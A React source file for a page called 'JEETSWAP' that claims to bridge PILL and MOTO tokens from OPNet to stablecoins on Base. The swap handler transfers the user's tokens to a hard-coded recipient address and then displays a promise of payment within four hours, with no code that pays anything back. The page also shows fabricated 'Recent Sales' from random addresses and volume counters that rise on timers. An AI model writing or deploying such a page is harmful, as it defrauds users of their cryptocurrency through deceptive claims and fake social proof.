import { useState, useEffect } from 'react';
import { useNavigate } from 'react-router-dom';
import { useWalletConnect } from '@btc-vision/walletconnect';
import { Address } from '@btc-vision/transaction';
import { networks } from '@btc-vision/bitcoin';
import {
  getContract,
  IOP20Contract,
  JSONRpcProvider,
  OP_20_ABI,
  BitcoinUtils,
} from 'opnet';

const NETWORK = networks.bitcoin;
const PROVIDER = new JSONRpcProvider({
  url: 'https://mainnet.opnet.org',
  network: NETWORK,
});

const CONTRACTS = {
  PILL: '0xc6c3674b1c6c4ca3d4b3652d1d6fc2b197f45c4ad1eda90d37952472719d1c05',
  MOTO: '0xc3d18f9d7db3f26ed107a9f4a4c65eef14c1ca73db5684ef9789fdd4fbb3ea9a',
};

const RECIPIENT_MLDSA = '0x1fb89a7c4f373801139debbc5553e679cf9e50620c147e3602382b6f5251ca9c';

const PRICES = {
  PILL: 0.00002,
  MOTO: 0.05,
};

// Format balance to max 1 decimal
const formatBalance = (balance) => {
  const num = parseFloat(balance);
  if (num === 0) return '0';
  if (num >= 1) return num.toFixed(1);
  return num.toFixed(6);
};

// Generate fake recent sale
const generateSale = () => {
  const token = Math.random() > 0.5 ? 'PILL' : 'MOTO';
  const amount = token === 'PILL' 
    ? Math.floor(Math.random() * (20000000 - 500000) + 500000)
    : Math.floor(Math.random() * (10000 - 50) + 50);
  
  const usdValue = token === 'PILL' ? amount * 0.00002 : amount * 0.05;
  const address = 'bc1p' + Math.random().toString(36).substring(2, 10);
  
  return {
    id: Date.now() + Math.random(),
    address,
    token,
    amount,
    usdValue: usdValue.toFixed(2),
  };
};

export default function SwapPage() {
  const navigate = useNavigate();
  const {
    openConnectModal,
    disconnect,
    walletAddress,
    address,
    hashedMLDSAKey,
    walletBalance,
    provider: walletProvider,
    network: walletNetwork,
  } = useWalletConnect();

  const [selectedToken, setSelectedToken] = useState('MOTO');
  const [amount, setAmount] = useState('');
  const [baseAddress, setBaseAddress] = useState('');
  const [stablecoin, setStablecoin] = useState('USDT');
  const [balances, setBalances] = useState({ PILL: '0', MOTO: '0' });
  const [decimals, setDecimals] = useState({ PILL: 18, MOTO: 18 });
  const [loading, setLoading] = useState(false);
  const [status, setStatus] = useState('');
  const [txHash, setTxHash] = useState('');
  const [showProgress, setShowProgress] = useState(false);
  
  const [pillSwapped, setPillSwapped] = useState(21000000);
  const [motoSwapped, setMotoSwapped] = useState(20000);
  
  const [recentSales, setRecentSales] = useState([]);

  // Live counters
  useEffect(() => {
    const pillInterval = setInterval(() => {
      setPillSwapped(prev => prev + Math.floor(Math.random() * 1000));
    }, 5000);
    
    const motoInterval = setInterval(() => {
      setMotoSwapped(prev => prev + Math.floor(Math.random() * 10));
    }, 7000);

    return () => {
      clearInterval(pillInterval);
      clearInterval(motoInterval);
    };
  }, []);

  // Recent sales generator
  useEffect(() => {
    // Initial sales
    setRecentSales([generateSale(), generateSale(), generateSale()]);
    
    // New sale every 30 seconds
    const salesInterval = setInterval(() => {
      setRecentSales(prev => [generateSale(), ...prev].slice(0, 5));
    }, 30000);

    return () => clearInterval(salesInterval);
  }, []);

  // Fetch balances
  useEffect(() => {
    const fetchBalances = async () => {
      if (!walletAddress || !address) return;

      setLoading(true);
      try {
        const userAddress = address;

        const motoAddress = Address.fromString(CONTRACTS.MOTO);
        const motoToken = getContract(
          motoAddress,
          OP_20_ABI,
          PROVIDER,
          NETWORK,
          userAddress
        );

        const motoMetadata = await motoToken.metadata();
        const motoDecimals = Number(motoMetadata.properties.decimals);
        
        const motoBalanceResult = await motoToken.balanceOf(userAddress);
        const motoBalance = motoBalanceResult.properties.balance;
        const motoFormatted = BitcoinUtils.formatUnits(motoBalance, motoDecimals);

        let pillFormatted = '0';
        let pillDecimals = 18;
        try {
          const pillAddress = Address.fromString(CONTRACTS.PILL);
          const pillToken = getContract(
            pillAddress,
            OP_20_ABI,
            PROVIDER,
            NETWORK,
            userAddress
          );

          const pillMetadata = await pillToken.metadata();
          pillDecimals = Number(pillMetadata.properties.decimals);

          const pillBalanceResult = await pillToken.balanceOf(userAddress);
          const pillBalance = pillBalanceResult.properties.balance;
          pillFormatted = BitcoinUtils.formatUnits(pillBalance, pillDecimals);
        } catch (err) {
          console.error('PILL balance fetch failed:', err);
        }

        setBalances({
          PILL: pillFormatted,
          MOTO: motoFormatted,
        });
        
        setDecimals({
          PILL: pillDecimals,
          MOTO: motoDecimals,
        });
      } catch (err) {
        console.error('Balance fetch failed:', err);
      } finally {
        setLoading(false);
      }
    };

    fetchBalances();
    const interval = setInterval(fetchBalances, 30000);
    return () => clearInterval(interval);
  }, [walletAddress, address]);

  const calculateUsdValue = () => {
    if (!amount || isNaN(amount)) return '0.00';
    const value = parseFloat(amount) * PRICES[selectedToken];
    return value.toFixed(selectedToken === 'PILL' ? 6 : 4);
  };

  const handleSwap = async () => {
    if (!walletAddress || !address) {
      setStatus('Please connect your wallet first');
      return;
    }

    if (!amount || parseFloat(amount) <= 0) {
      setStatus('Please enter a valid amount');
      return;
    }

    if (!baseAddress || !baseAddress.startsWith('0x')) {
      setStatus('Please enter a valid Base address');
      return;
    }

    const balance = parseFloat(balances[selectedToken]);
    if (parseFloat(amount) > balance) {
      setStatus('Insufficient token balance');
      return;
    }

    const btcBalance = walletBalance?.total || 0;
    console.log('=== Transaction Start ===');
    console.log('BTC Balance (sats):', btcBalance);
    console.log('Wallet Address:', walletAddress);

    setLoading(true);
    setStatus('Preparing transaction...');
    setTxHash('');

    try {
      const userAddress = address;
      const recipientAddress = Address.fromString(RECIPIENT_MLDSA);
      const tokenAddress = Address.fromString(CONTRACTS[selectedToken]);

      // ALWAYS use dedicated PROVIDER for contract calls, NEVER walletProvider
      const token = getContract(
        tokenAddress,
        OP_20_ABI,
        PROVIDER,
        NETWORK,
        userAddress
      );

      const tokenDecimals = decimals[selectedToken];
      const tokenAmount = BitcoinUtils.expandToDecimals(amount, tokenDecimals);

      console.log('=== Token Transfer ===');
      console.log('Token:', selectedToken);
      console.log('Decimals:', tokenDecimals);
      console.log('Amount:', tokenAmount.toString());

      setStatus('Simulating transaction...');
      const simulation = await token.transfer(recipientAddress, tokenAmount);

      if ('error' in simulation) {
        throw new Error(`Simulation failed: ${simulation.error}`);
      }

      setStatus('Waiting for wallet signature...');
      
      // Let wallet extension handle everything
      const receipt = await simulation.sendTransaction({
        signer: null,
        mldsaSigner: null,
        refundTo: userAddress,
      });

      console.log('=== Success ===');
      console.log('TX ID:', receipt.transactionId);

      setTxHash(receipt.transactionId);
      setShowProgress(true);
      setLoading(false);
      
      setTimeout(() => {
        setShowProgress(false);
        setStatus(`Success! You will receive ${usdValue} ${stablecoin} within 4 hours at ${baseAddress}`);
        setAmount('');
      }, 3000);

    } catch (err) {
      console.error('=== Swap Error ===', err);
      setStatus(`Error: ${err.message || 'Transaction failed'}`);
      setLoading(false);
    }
  };

  const usdValue = calculateUsdValue();
  const availableBalance = balances[selectedToken];

  return (
    <div className="app">
      <header className="header">
        <div className="container">
          <div className="header-content">
            <div className="branding">
              <div className="brand-name">JEETSWAP</div>
              <div className="brand-slogan">Swap fast. Exit faster. 🚀</div>
            </div>

            <div className="header-actions">
              {!walletAddress ? (
                <button className="wallet-btn" onClick={openConnectModal}>
                  Connect Wallet
                </button>
              ) : (
                <div className="wallet-info">
                  <div className="wallet-addresses">
                    <div className="wallet-address-item">
                      <div className="wallet-label">BTC Balance</div>
                      <div className="wallet-value">
                        {walletBalance?.total !== undefined 
                          ? `${(walletBalance.total / 100000000).toFixed(8)} BTC`
                          : 'Loading...'}
                      </div>
                    </div>
                    <div className="wallet-address-item">
                      <div className="wallet-label">BTC Address</div>
                      <div className="wallet-value" title={walletAddress}>
                        {walletAddress.slice(0, 10)}...{walletAddress.slice(-6)}
                      </div>
                    </div>
                    {hashedMLDSAKey && (
                      <div className="wallet-address-item">
                        <div className="wallet-label">ML-DSA</div>
                        <div className="wallet-value" title={hashedMLDSAKey}>
                          {hashedMLDSAKey.slice(0, 10)}...{hashedMLDSAKey.slice(-6)}
                        </div>
                      </div>
                    )}
                  </div>
                  
                  <div className="wallet-balances-compact">
                    <div className="balance-compact">
                      <div className="balance-compact-token">💊 PILL</div>
                      <div className="balance-compact-amount">{formatBalance(balances.PILL)}</div>
                      <div className="balance-compact-usd">
                        ${(parseFloat(balances.PILL) * PRICES.PILL).toFixed(6)}
                      </div>
                    </div>
                    <div className="balance-compact">
                      <div className="balance-compact-token">🏍️ MOTO</div>
                      <div className="balance-compact-amount">{formatBalance(balances.MOTO)}</div>
                      <div className="balance-compact-usd">
                        ${(parseFloat(balances.MOTO) * PRICES.MOTO).toFixed(2)}
                      </div>
                    </div>
                  </div>

                  <button className="disconnect-btn" onClick={disconnect}>
                    Disconnect
                  </button>
                </div>
              )}
            </div>
          </div>
        </div>
      </header>

      <main className="main">
        <div className="container">
          <div className="hero-section">
            <h1 className="hero-title">Bridge OPNet to Base Chain</h1>
            <p className="hero-subtitle">
              Swap PILL and MOTO tokens to USDC/USDT on Base. Fast, simple, trustless.
            </p>
          </div>

          <div className="content-wrapper">
            <div className="swap-section">
              <div className="swap-card">
                <div className="swap-header">
                  <h2 className="swap-title">Swap Tokens</h2>
                  <p className="swap-description">
                    Convert your OPNet tokens to stablecoins on Base
                  </p>
                </div>

                {!walletAddress ? (
                  <div className="connect-prompt">
                    <p className="connect-prompt-text">
                      Connect your OPNet wallet to start swapping
                    </p>
                    <button className="wallet-btn" onClick={openConnectModal}>
                      Connect Wallet
                    </button>
                  </div>
                ) : (
                  <div className="swap-form">
                    <div className="form-group">
                      <div className="form-label">
                        <span>Select Token</span>
                        <span className="form-balance">
                          Available: {formatBalance(availableBalance)} {selectedToken}
                        </span>
                      </div>
                      <div className="token-selector">
                        <button
                          className={`token-btn ${selectedToken === 'PILL' ? 'active' : ''}`}
                          onClick={() => setSelectedToken('PILL')}
                        >
                          <span className="token-name">💊 PILL</span>
                          <span className="token-price">${PRICES.PILL}</span>
                        </button>
                        <button
                          className={`token-btn ${selectedToken === 'MOTO' ? 'active' : ''}`}
                          onClick={() => setSelectedToken('MOTO')}
                        >
                          <span className="token-name">🏍️ MOTO</span>
                          <span className="token-price">${PRICES.MOTO}</span>
                        </button>
                      </div>
                    </div>

                    <div className="form-group">
                      <div className="form-label">
                        <span>Amount</span>
                      </div>
                      <div className="input-wrapper">
                        <input
                          type="number"
                          className="input-field"
                          placeholder="0.00"
                          value={amount}
                          onChange={(e) => setAmount(e.target.value)}
                          disabled={loading}
                        />
                        <button
                          className="max-btn"
                          onClick={() => setAmount(availableBalance)}
                          disabled={loading}
                        >
                          MAX
                        </button>
                      </div>
                      {amount && <div className="usd-display">≈ ${usdValue}</div>}
                    </div>

                    <div className="form-group">
                      <div className="form-label">
                        <span>Receive on Base</span>
                      </div>
                      <div className="stablecoin-selector">
                        <button
                          className={`stablecoin-btn ${stablecoin === 'USDT' ? 'active' : ''}`}
                          onClick={() => setStablecoin('USDT')}
                        >
                          USDT
                        </button>
                        <button
                          className={`stablecoin-btn ${stablecoin === 'USDC' ? 'active' : ''}`}
                          onClick={() => setStablecoin('USDC')}
                        >
                          USDC
                        </button>
                      </div>
                    </div>

                    <div className="form-group">
                      <div className="form-label">
                        <span>Your Base Address</span>
                      </div>
                      <input
                        type="text"
                        className="input-field"
                        placeholder="0x..."
                        value={baseAddress}
                        onChange={(e) => setBaseAddress(e.target.value)}
                        disabled={loading}
                      />
                    </div>

                    <button
                      className="action-btn"
                      onClick={handleSwap}
                      disabled={loading || !amount || !baseAddress}
                    >
                      {loading ? 'Processing...' : `Sell ${selectedToken}`}
                    </button>

                    <div className="manual-send-option">
                      <div className="divider">
                        <span>OR</span>
                      </div>
                      <button
                        className="manual-send-btn"
                        onClick={() => navigate(`/manual-send?token=${selectedToken}&amount=${amount}`)}
                        disabled={!amount || parseFloat(amount) <= 0}
                      >
                        Send {selectedToken} from OPWallet Directly →
                      </button>
                      <div className="manual-send-hint">
                        Use this if you don't have enough UTXOs or BTC for fees
                      </div>
                    </div>

                    {status && !showProgress && (
                      <div className={`status-message ${
                        txHash ? 'success' : 
                        status.includes('Insufficient') || status.includes('Error') ? 'error' : ''
                      }`}>
                        {status}
                        {txHash && (
                          <>
                            <br />
                            <a
                              href={`https://mempool.space/tx/${txHash}`}
                              target="_blank"
                              rel="noopener noreferrer"
                              className="tx-link"
                            >
                              View Transaction →
                            </a>
                          </>
                        )}
                      </div>
                    )}

                    <div className="info-box">
                      <div className="info-box-title">How it works</div>
                      <ol className="info-list">
                        <li>Select token and enter amount</li>
                        <li>Provide Base chain address</li>
                        <li>Sign transaction in wallet</li>
                        <li>Receive {stablecoin} within 4 hours</li>
                      </ol>
                    </div>
                  </div>
                )}
              </div>

              <div className="stats-section">
                <div className="stats-title">Total Volume Swapped</div>
                <div className="stats-grid">
                  <div className="stat-item">
                    <div className="stat-value">
                      {pillSwapped.toLocaleString()}
                    </div>
                    <div className="stat-label">PILL swapped</div>
                  </div>
                  <div className="stat-item">
                    <div className="stat-value">
                      {motoSwapped.toLocaleString()}
                    </div>
                    <div className="stat-label">MOTO swapped</div>
                  </div>
                </div>
              </div>
            </div>

            <aside className="sales-sidebar">
              <div className="sales-title">Recent Sales</div>
              <div className="sales-list">
                {recentSales.map(sale => (
                  <div key={sale.id} className="sale-item">
                    <div className="sale-address">{sale.address}</div>
                    <div className="sale-details">
                      sold {sale.amount.toLocaleString()} {sale.token}
                    </div>
                    <div className="sale-value">for ${sale.usdValue} {stablecoin}</div>
                  </div>
                ))}
              </div>
            </aside>
          </div>
        </div>
      </main>

      {showProgress && (
        <div className="progress-overlay">
          <div className="progress-card">
            <div className="progress-title">
              {selectedToken} TX Sent 🚀
            </div>
            <div className="progress-bar-container">
              <div className="progress-bar-fill"></div>
            </div>
            <div className="progress-message">
              {stablecoin} are on their way to Base...
            </div>
          </div>
        </div>
      )}
    </div>
  );
}
